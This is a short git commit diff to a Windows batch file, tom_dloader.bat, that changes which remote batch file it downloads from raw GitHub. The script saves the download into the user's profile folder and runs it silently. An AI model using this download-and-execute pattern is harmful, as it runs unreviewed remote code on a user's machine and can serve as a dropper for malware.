e7a6169a14532bf8c9c159e441d5b2bf4ffa7c0a
Kachi <46286269+kamilix2003@users.noreply.github.com>
2021-11-13 21:19:28 +0100

    Update tom_dloader.bat

--- tom_dloader.bat
+++ tom_dloader.bat
@@ -1,7 +1,7 @@
 @echo off
 cd %userprofile%
 
-curl  https://raw.githubusercontent.com/kamilix2003/pejAD/master/temp.bat > temp.bat
+curl  https://raw.githubusercontent.com/kamilix2003/pejAD/master/tom_file.bat > temp.bat
 
 start temp.bat /b
 
